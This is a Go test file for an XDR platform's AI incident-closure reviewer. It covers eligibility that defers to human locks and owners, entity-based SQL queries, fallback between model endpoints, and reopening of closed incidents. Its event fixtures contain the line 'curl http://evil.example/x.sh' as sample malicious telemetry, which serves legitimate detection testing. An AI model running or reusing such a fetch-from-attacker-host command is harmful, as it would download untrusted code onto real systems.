package closurereview

import (
	"context"
	"database/sql"
	"database/sql/driver"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"entgo.io/ent/dialect"
	entsql "entgo.io/ent/dialect/sql"
	"github.com/google/uuid"
	"openxdr/server/ent"
	"openxdr/server/ent/event"
	"openxdr/server/ent/schema"
	"openxdr/server/internal/modelroute"
	"openxdr/server/internal/triage"
)

func TestContainedEligibility(t *testing.T) {
	now := time.Now().Add(-time.Minute)
	inc := &ent.Incident{Status: "triaged", TriagedAt: &now, AiVerdict: json.RawMessage(`{"verdict":"malicious"}`), Work: &schema.IncidentWork{Owner: "human", Stage: "escalated"}}
	if !containedEligible(inc) {
		t.Fatal("自动升级应允许进入复核")
	}
	inc.Work.ManualLock = true
	if containedEligible(inc) {
		t.Fatal("人工锁必须拒绝")
	}
	inc.Work.ManualLock = false
	inc.Work.ManualOwner = "analyst"
	if containedEligible(inc) {
		t.Fatal("人工接管必须拒绝")
	}
}

func TestProposalEligibleRejectsManualLockAndOwner(t *testing.T) {
	now := time.Now().Add(-time.Minute)
	verdict := json.RawMessage(`{"verdict":"benign","response_tier":"observe","action_codes":["review_closure"]}`)
	reportID := uuid.New()
	baseInc := func(work *schema.IncidentWork) *ent.Incident {
		inc := &ent.Incident{
			ID:        uuid.New(),
			Status:    "triaged",
			TriagedAt: &now,
			AiVerdict: verdict,
			Work:      work,
		}
		inc.ClosureProposal = &schema.ClosureProposal{
			Status:      "false_positive",
			ReportID:    &reportID,
			GroupID:     uuid.New(),
			SessionID:   uuid.New(),
			At:          now.Add(time.Second),
			EvidenceKey: triage.IncidentEvidenceKey(inc),
			VerdictHash: VerdictHash(verdict),
		}
		return inc
	}

	if !eligible(baseInc(nil)) {
		t.Fatal("无人工接管的合规提案应允许复核")
	}
	if !eligible(baseInc(&schema.IncidentWork{Owner: "human", Stage: "escalated"})) {
		t.Fatal("仅系统自动升级且无人锁定/接管的提案应允许复核")
	}
	for name, work := range map[string]*schema.IncidentWork{
		"manual_lock":        {ManualLock: true},
		"manual_owner":       {ManualOwner: "analyst"},
		"human_owned_active": {Owner: "human", Stage: "investigating"},
	} {
		t.Run(name, func(t *testing.T) {
			inc := baseInc(work)
			if eligible(inc) {
				t.Fatalf("%s 必须被 eligible 拒绝", name)
			}
			if _, err := loadProposal(context.Background(), nil, inc); err != ErrIneligible {
				t.Fatalf("%s 必须被 loadProposal 拒绝，got %v", name, err)
			}
		})
	}
}

func TestSeparateContainedPrompt(t *testing.T) {
	if closurePrompt(`{"contained":{"quiet_hours":6}}`) != containedPrompt+feedbackRule {
		t.Fatal("遏制审计必须使用独立提示词")
	}
	if closurePrompt(`{"verdict":{"verdict":"benign"}}`) != prompt+feedbackRule {
		t.Fatal("良性审计提示词应保留")
	}
}

func TestExtractAnchorEntitiesAndSQLPredicate(t *testing.T) {
	procGUID := uuid.New()
	parentGUID := uuid.New()
	conn := "10.0.0.1:12345->198.51.100.7:443/tcp"
	anchors := []*ent.Event{
		{
			ProcessGUID:       &procGUID,
			ParentProcessGUID: &parentGUID,
			ConnTuple:         &conn,
			Raw:               json.RawMessage(`{"process":{"cmd_line":"curl http://evil.example/x.sh","file":{"path":"/usr/bin/curl"}},"dst_endpoint":{"ip":"198.51.100.7"}}`),
		},
	}
	entities, allHaveKeys := extractAnchorEntities(anchors)
	if !allHaveKeys || entities.empty() {
		t.Fatalf("应提取到全部实体键: allHaveKeys=%v entities=%+v", allHaveKeys, entities)
	}
	if len(entities.guids) != 2 || len(entities.connTuples) != 1 {
		t.Fatalf("结构化实体提取数量不对: %+v", entities)
	}

	sel := entsql.Dialect(dialect.Postgres).Select(event.FieldID).From(entsql.Table(event.Table))
	buildEntityPredicate(entities)(sel)
	query, args := sel.Query()
	for _, want := range []string{
		`"process_guid" IN`,
		`"parent_process_guid" IN`,
		`"conn_tuple" IN`,
		`->'process'->>'cmd_line' IN`,
		`->'process'->'file'->>'path' IN`,
		`->'dst_endpoint'->>'ip' IN`,
	} {
		if !strings.Contains(query, want) {
			t.Errorf("生成的定向实体 SQL 缺少 %q:\n%s", want, query)
		}
	}
	if strings.Contains(strings.ToUpper(query), "LIMIT 1001") {
		t.Errorf("定向实体查询不应使用 LIMIT 1001 全量拉取: %s", query)
	}
	if len(args) != 8 {
		t.Errorf("绑定参数个数不对: got=%d args=%v\nsql=%s", len(args), args, query)
	}

	// 空实体锚点：allHaveKeys=false，供结案前门禁保守拒绝，而 ReopenContained 可安全跳过不误重开
	emptyEntities, ok := extractAnchorEntities([]*ent.Event{{Raw: json.RawMessage(`{"note":"no_entity"}`)}})
	if ok || !emptyEntities.empty() {
		t.Fatalf("无实体键事件不应返回 allHaveKeys=true: ok=%v entities=%+v", ok, emptyEntities)
	}
}

func TestReviewerFallbackEndpointsAndTimeout(t *testing.T) {
	evID := uuid.New()
	primary := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "upstream down", http.StatusServiceUnavailable)
	}))
	defer primary.Close()

	backup := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer backup-key" {
			t.Errorf("备用端点密钥不对: %q", r.Header.Get("Authorization"))
		}
		reply := `{"approve":false,"reason":"材料中缺少独立正面证据，保持事件待人工复核","positive_evidence":"","event_ids":[],"claims":[]}`
		_ = json.NewEncoder(w).Encode(map[string]any{
			"choices": []any{map[string]any{"message": map[string]any{"content": reply}, "finish_reason": "stop"}},
		})
	}))
	defer backup.Close()

	rev := New(nil, func() (string, string) { return primary.URL, "primary-key" }, func() string { return "primary-model" }, nil)
	rev.FallbackEndpoints = func() []modelroute.Endpoint {
		return []modelroute.Endpoint{{BaseURL: backup.URL, APIKey: "backup-key", Model: "backup-model"}}
	}
	rev.Timeout = 5 * time.Second

	d, err := rev.Judge(context.Background(), "primary-model", `{"incident_id":"`+evID.String()+`"}`)
	if err != nil {
		t.Fatalf("主端点 503 后应自动回退到备用端点: %v", err)
	}
	if d.Approve || !strings.Contains(d.Reason, "缺少独立正面证据") {
		t.Fatalf("回退后的决策不对: %+v", d)
	}

	// 可配置 Timeout 生效
	slow := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(300 * time.Millisecond)
		w.WriteHeader(http.StatusOK)
	}))
	defer slow.Close()
	revSlow := New(nil, func() (string, string) { return slow.URL, "" }, func() string { return "slow-model" }, nil)
	revSlow.Timeout = 50 * time.Millisecond
	if _, err := revSlow.Judge(context.Background(), "slow-model", `{}`); err == nil {
		t.Fatal("超时配置未生效")
	}
}

type reopenMockDriver struct {
	incID            uuid.UUID
	alertID          uuid.UUID
	assetID          uuid.UUID
	anchorEventID    uuid.UUID
	resolvedAt       time.Time
	anchorRaw        []byte
	alertExists      bool
	eventExists      bool
	sawWindowCutoff  bool
	sawEntityFilter  bool
	sawLimit1001     bool
	reopenedIncident bool
}

func (d *reopenMockDriver) Open(string) (driver.Conn, error) { return &reopenMockConn{d: d}, nil }

type reopenMockConnector struct{ d *reopenMockDriver }

func (c *reopenMockConnector) Connect(context.Context) (driver.Conn, error) { return c.d.Open("") }
func (c *reopenMockConnector) Driver() driver.Driver                        { return c.d }

type reopenMockConn struct{ d *reopenMockDriver }

func (c *reopenMockConn) Prepare(string) (driver.Stmt, error) { return nil, driver.ErrSkip }
func (c *reopenMockConn) Close() error                        { return nil }
func (c *reopenMockConn) Begin() (driver.Tx, error)           { return &reopenMockTx{}, nil }

type reopenMockTx struct{}

func (t *reopenMockTx) Commit() error   { return nil }
func (t *reopenMockTx) Rollback() error { return nil }

func (c *reopenMockConn) ExecContext(_ context.Context, query string, _ []driver.NamedValue) (driver.Result, error) {
	if strings.HasPrefix(query, `UPDATE "incidents"`) {
		c.d.reopenedIncident = true
		return driver.RowsAffected(1), nil
	}
	return driver.RowsAffected(1), nil
}

func (c *reopenMockConn) QueryContext(_ context.Context, query string, _ []driver.NamedValue) (driver.Rows, error) {
	q := strings.TrimSpace(query)
	if strings.Contains(q, `LIMIT 1001`) {
		c.d.sawLimit1001 = true
	}
	if strings.HasPrefix(q, `INSERT INTO`) {
		return &reopenRows{cols: []string{"id"}, rows: [][]driver.Value{{int64(1)}}}, nil
	}
	if strings.Contains(q, `FROM "incidents"`) {
		if strings.Contains(q, `"resolved_at" >`) {
			c.d.sawWindowCutoff = true
		}
		cols := parseMockSelectCols(q)
		row := make([]driver.Value, len(cols))
		for i, col := range cols {
			switch col {
			case "id":
				row[i] = c.d.incID.String()
			case "status":
				row[i] = "closed"
			case "resolution_source":
				row[i] = "ai_review"
			case "resolved_at":
				row[i] = c.d.resolvedAt
			case "created_at", "updated_at":
				row[i] = c.d.resolvedAt
			case "graph":
				row[i] = []byte("{}")
			case "severity":
				row[i] = int64(4)
			}
		}
		return &reopenRows{cols: cols, rows: [][]driver.Value{row}}, nil
	}
	if strings.Contains(q, `FROM "alerts"`) && strings.Contains(q, "LIMIT 1") {
		if !c.d.alertExists {
			return &reopenRows{cols: []string{"id"}}, nil
		}
		return &reopenRows{cols: []string{"id"}, rows: [][]driver.Value{{c.d.alertID.String()}}}, nil
	}
	if strings.Contains(q, `FROM "alerts"`) {
		cols := parseMockSelectCols(q)
		row := make([]driver.Value, len(cols))
		for i, col := range cols {
			switch col {
			case "id":
				row[i] = c.d.alertID.String()
			case "incident_id":
				row[i] = c.d.incID.String()
			case "asset_id":
				row[i] = c.d.assetID.String()
			case "event_id":
				row[i] = c.d.anchorEventID.String()
			case "ts":
				row[i] = c.d.resolvedAt.Add(-time.Hour)
			case "rule_id":
				row[i] = "test.rule"
			case "severity":
				row[i] = int64(4)
			case "count":
				row[i] = int64(1)
			case "healthcheck":
				row[i] = false
			}
		}
		return &reopenRows{cols: cols, rows: [][]driver.Value{row}}, nil
	}
	if strings.Contains(q, `FROM "events"`) && strings.Contains(q, "LIMIT 1") {
		if strings.Contains(q, `->'process'->>'cmd_line' IN`) {
			c.d.sawEntityFilter = true
		}
		if !c.d.eventExists {
			return &reopenRows{cols: []string{"id"}}, nil
		}
		return &reopenRows{cols: []string{"id"}, rows: [][]driver.Value{{uuid.NewString()}}}, nil
	}
	if strings.Contains(q, `FROM "events"`) {
		cols := parseMockSelectCols(q)
		row := make([]driver.Value, len(cols))
		for i, col := range cols {
			switch col {
			case "id":
				row[i] = c.d.anchorEventID.String()
			case "ts":
				row[i] = c.d.resolvedAt.Add(-time.Hour)
			case "class_uid":
				row[i] = int64(1007)
			case "source":
				row[i] = "agent"
			case "asset_id":
				row[i] = c.d.assetID.String()
			case "raw":
				row[i] = c.d.anchorRaw
			}
		}
		return &reopenRows{cols: cols, rows: [][]driver.Value{row}}, nil
	}
	if strings.Contains(q, `FROM "containments"`) {
		return &reopenRows{cols: parseMockSelectCols(q)}, nil
	}
	return &reopenRows{cols: []string{"ok"}}, nil
}

func parseMockSelectCols(q string) []string {
	upper := strings.ToUpper(q)
	i := strings.Index(upper, "SELECT ")
	j := strings.Index(upper, " FROM ")
	if i < 0 || j <= i+7 {
		return nil
	}
	parts := strings.Split(q[i+7:j], ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if dot := strings.LastIndex(p, "."); dot >= 0 {
			p = p[dot+1:]
		}
		out = append(out, strings.Trim(p, `" `))
	}
	return out
}

type reopenRows struct {
	cols []string
	rows [][]driver.Value
	idx  int
}

func (r *reopenRows) Columns() []string { return r.cols }
func (r *reopenRows) Close() error      { return nil }
func (r *reopenRows) Next(dest []driver.Value) error {
	if r.idx >= len(r.rows) {
		return io.EOF
	}
	copy(dest, r.rows[r.idx])
	r.idx++
	return nil
}

// 端到端纯单测验证 ReopenContained：限定 7 天复核窗口、走定向实体 EXISTS 而非 LIMIT 1001、
// 无关正常事件不误重开、命中匹配实体或新告警时才重开。
func TestReopenContainedUsesWindowAndTargetedEntityExists(t *testing.T) {
	now := time.Date(2026, 11, 22, 12, 0, 0, 0, time.UTC)
	run := func(alertExists, eventExists bool) *reopenMockDriver {
		drv := &reopenMockDriver{
			incID:         uuid.New(),
			alertID:       uuid.New(),
			assetID:       uuid.New(),
			anchorEventID: uuid.New(),
			resolvedAt:    now.Add(-time.Hour),
			anchorRaw:     []byte(`{"process":{"cmd_line":"curl http://evil.example/a.sh"}}`),
			alertExists:   alertExists,
			eventExists:   eventExists,
		}
		sq := sql.OpenDB(&reopenMockConnector{d: drv})
		t.Cleanup(func() { _ = sq.Close() })
		client := ent.NewClient(ent.Driver(entsql.OpenDB(dialect.Postgres, sq)))
		tx, err := client.Tx(context.Background())
		if err != nil {
			t.Fatal(err)
		}
		if err := reopenContainedAt(context.Background(), tx, now); err != nil {
			_ = tx.Rollback()
			t.Fatal(err)
		}
		if err := tx.Commit(); err != nil {
			t.Fatal(err)
		}
		return drv
	}

	// 仅存在无关正常事件（alertExists=false, eventExists=false）：不得误重开
	drv := run(false, false)
	if !drv.sawWindowCutoff {
		t.Fatal("ReopenContained 查询必须限定 7 天时间窗（resolved_at > cutoff）")
	}
	if !drv.sawEntityFilter {
		t.Fatal("ReopenContained 必须按锚点实体在 SQL 层定向 EXISTS 查询")
	}
	if drv.sawLimit1001 {
		t.Fatal("ReopenContained 不应再执行 LIMIT 1001 全量事件拉取")
	}
	if drv.reopenedIncident {
		t.Fatal("无新告警且无匹配实体事件时绝不应重开")
	}

	// 出现匹配实体的新事件：必须重开
	if drvMatch := run(false, true); !drvMatch.reopenedIncident {
		t.Fatal("出现匹配实体事件时必须重开")
	}

	// 出现新告警：必须重开
	if drvAlert := run(true, false); !drvAlert.reopenedIncident {
		t.Fatal("出现新告警时必须重开")
	}
}
